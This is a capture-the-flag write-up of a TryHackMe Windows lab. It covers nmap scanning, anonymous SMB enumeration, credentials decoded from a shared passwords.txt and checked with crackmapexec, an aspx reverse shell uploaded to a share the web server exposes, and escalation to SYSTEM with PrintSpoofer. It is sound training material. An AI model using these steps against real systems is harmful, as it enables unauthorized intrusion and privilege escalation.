---
title: "Relevant TryHackMe Write-Up"
categories:
  - Write-Ups
---
[Relevant](https://tryhackme.com/room/relevant) is a Windows room inside of TryHackMe's Offensive Pentesting learning path that tests one's ability to enumerate.

Here was my approach to hacking this machine:
* Enumerated SMB shares and uploaded a reverse shell
* Found a reflection point on a web server and got RCE
* PrivEsc with SeImpersonatePrivilege and PrintSpoofer

![](https://user-images.githubusercontent.com/85040841/152708651-c2cc093d-e7d2-4612-abfe-926a6da213f8.png)

# Scanning

```python
┌──(kali㉿kali)-[~/thm/relevantRoom]
└─$ sudo nmap -Pn -n -p- 10.10.31.56 -T4 -oN nmapALL
Not shown: 65528 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49663/tcp open  unknown
49667/tcp open  unknown
```

TCP ports 80, 135, 139, 445, 3389, 49663, and 49667 are open.

Knowing this, I'll run a detailed scan on those ports using default scripts and version detection.

```python
. . .
49663/tcp open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
. . .
```

An additional web server is being hosted on one of the high ports (49663), which is good to know.

# Enumeration

Let's examine the web server on port 80.

After opening its index page in my browser, this is what I was presented with — the default page for Microsoft IIS web servers.

![](https://user-images.githubusercontent.com/85040841/152703977-763cca9c-f21e-4f09-89c7-e5bb3f159186.png)

Enumerating subdirectories with Gobuster didn't lead to anything notable, so I moved on to listing the SMB shares.

With smbclient, we can add the "-N" and "-L" flags to use null authentication and list available shares.

```python
┌──(kali㉿kali)-[~/thm/relevantRoom]
└─$ smbclient -N -L 10.10.31.56

  Sharename       Type      Comment
  ---------       ----      -------
  ADMIN$          Disk      Remote Admin
  C$              Disk      Default share
  IPC$            IPC       Remote IPC
  nt4wrksv        Disk
```

There's a non-default share called "nt4wrksv".

Let's try to connect to it.

```python
┌──(kali㉿kali)-[~/thm/relevantRoom]
└─$ smbclient -N '\\10.10.31.56\nt4wrksv'
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jul 25 17:46:04 2020
  ..                                  D        0  Sat Jul 25 17:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020

                7735807 blocks of size 4096. 5135666 blocks available
smb: \> get passwords.txt 
getting file \passwords.txt of size 98 as passwords.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
```

After connecting to the share and listing its files, we see a "passwords.txt" file.

I ran "get passwords.txt" to download the file to my local machine.

Displaying the content of this file shows that it has two base64 encoded strings.

![](https://user-images.githubusercontent.com/85040841/152703985-eb65ef96-bf59-4012-9632-32e037aa8dea.png)

Decoding them gives us the following username/password combos:

![](https://user-images.githubusercontent.com/85040841/152703996-8a1aec7b-6c09-4bb6-8985-6c1e4dcfaf3a.png)

Let's use Crackmapexec to see if any of the credentials work.

```python
┌──(kali㉿kali)-[~/thm/relevantRoom]
└─$ cat users passwords                               
Bob
Bill
!P@$$W0rD!123
Juw4nnaM4n420696969!$$$
                                                                                                                                                               
┌──(kali㉿kali)-[~/thm/relevantRoom]
└─$ crackmapexec smb 10.10.31.56 -u users -p passwords
[*] Copying default configuration file
SMB   10.10.31.56   445   RELEVANT   [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)
SMB   10.10.31.56   445   RELEVANT   [+] Relevant\Bob:!P@$$W0rD!123
```

Crackmapexec tells us that the credentials we got for Bob are valid.

By listing the SMB shares with Bob's credentials, we see that he has Read and Write permissions for "nt4wrksv". 

```python
┌──(kali㉿kali)-[~/thm/relevantRoom]
└─$ crackmapexec smb 10.10.31.56 -u users -p passwords --shares
SMB   10.10.31.56    445   RELEVANT   [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)
SMB   10.10.31.56    445   RELEVANT   [+] Relevant\Bob:!P@$$W0rD!123 
SMB   10.10.31.56    445   RELEVANT   [+] Enumerated shares
SMB   10.10.31.56    445   RELEVANT   Share           Permissions     Remark
SMB   10.10.31.56    445   RELEVANT   -----           -----------     ------
SMB   10.10.31.56    445   RELEVANT   ADMIN$                          Remote Admin
SMB   10.10.31.56    445   RELEVANT   C$                              Default share
SMB   10.10.31.56    445   RELEVANT   IPC$                            Remote IPC
SMB   10.10.31.56    445   RELEVANT   nt4wrksv        READ,WRITE
```

Let's find out if this share is reflected on either of the web servers located on ports 80 and 49663.

If so, we can activate a reverse shell to get RCE.

The simple way to check whether or not this is the case is to use cURL.

We can send a GET request to both web servers with the share's name as our requested directory.

The "-i" flag will include the HTTP header in the output.

If we get a 200 OK response, the share is obviously reflected.

![](https://user-images.githubusercontent.com/85040841/152704020-612aa797-2536-4b98-89f5-1cc10651817c.png)

Bingo. The web server on port 49663 reflects the "nt4wrksv" share.

# Exploitation

Let's upload a reverse shell to the share, set up a listener, and activate the reverse shell with cURL.

A quick Google search led me to this repo for an aspx shell:

![](https://user-images.githubusercontent.com/85040841/152704026-ec894c70-ee6c-4465-83e1-ba19cfbec57a.png)

Let's download the file and edit it to include our IP address and listening port.

Then we can upload it to the share with smbclient.

![](https://user-images.githubusercontent.com/85040841/152704035-30c17bf8-9f41-4624-89ba-4d85e3786b7a.png)

After starting our listener and activating the reverse shell with cURL, we'll get RCE.

![](https://user-images.githubusercontent.com/85040841/152704046-a4d3632f-a01d-4e9a-b409-aa8c87993288.png)

![](https://user-images.githubusercontent.com/85040841/153111018-e58ff179-d5c0-48c6-9839-92bb1901e2d8.png)

Boom.

We're logged in as "iis apppool\defaultapppool", which can be seen as the Windows equivalent for "www-data".

Let's list our privileges with "whoami /priv".

```python
c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

"SeImpersonatePrivilege" is enabled and stands out as a vector for privilege escalation.

We can use "**[PrintSpoofer](https://github.com/itm4n/PrintSpoofer)"** to take advantage of this privilege and escalate to NT AUTHORITY\SYSTEM.

"systeminfo" tells us that the system has a 64-bit processor.

![](https://user-images.githubusercontent.com/85040841/152704064-e6eeb68d-a40f-4c27-86b9-7e3251d561d5.png)

Let's upload the "PrintSpoofer64.exe" file with smbclient.

![](https://user-images.githubusercontent.com/85040841/152704069-d8dfe4ce-383d-46d8-be60-aa5f78d0b63a.png)

Back on our netcat shell, a quick file search with "dir" shows us the location of the executable we uploaded.

```python
dir /s c:\PrintSpoofer64.exe
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\inetpub\wwwroot\nt4wrksv

 02/06/2022  01:31 PM         27,136 PrintSpoofer64.exe
            1 File(s)        27,136 bytes

 Total Files Listed:
            1 File(s)        27,136 bytes
            0 Dir(s)         21,118,365,696 bytes free
```

It was uploaded to "c:\inetpub\wwwroot\nt4wrksv", so I'll navigate there.

Let's run "PrintSpoofer64.exe" with the "-i" and "-c" flags, which state that we want an interactive process with the command we execute, "powershell".

![](https://user-images.githubusercontent.com/85040841/152704074-7da2691f-ae1d-4068-89c7-dc8adf064ba1.png)

And just like that, we're now NT AUTHORITY\SYSTEM.

### User and Root Flags:

```python
Directory: C:\Users\Bob

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/25/2020   2:04 PM                Desktop

cd Desktop
type user.txt
THM{fdk*******************f45}
PS C:\Users\Bob\Desktop>
```

```python
Directory: C:\Users\Administrator

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        7/25/2020   7:58 AM                Contacts
d-r---        7/25/2020   8:24 AM                Desktop
d-r---        7/25/2020   7:58 AM                Documents
d-r---        7/25/2020   8:39 AM                Downloads
d-r---        7/25/2020   7:58 AM                Favorites
d-r---        7/25/2020   7:58 AM                Links
d-r---        7/25/2020   7:58 AM                Music
d-r---        7/25/2020   7:58 AM                Pictures
d-r---        7/25/2020   7:58 AM                Saved Games
d-r---        7/25/2020   7:58 AM                Searches
d-r---        7/25/2020   7:58 AM                Videos
cd Desktop
type root.txt
THM{1fk*******************5pv}
PS C:\Users\Administrator\Desktop>
```
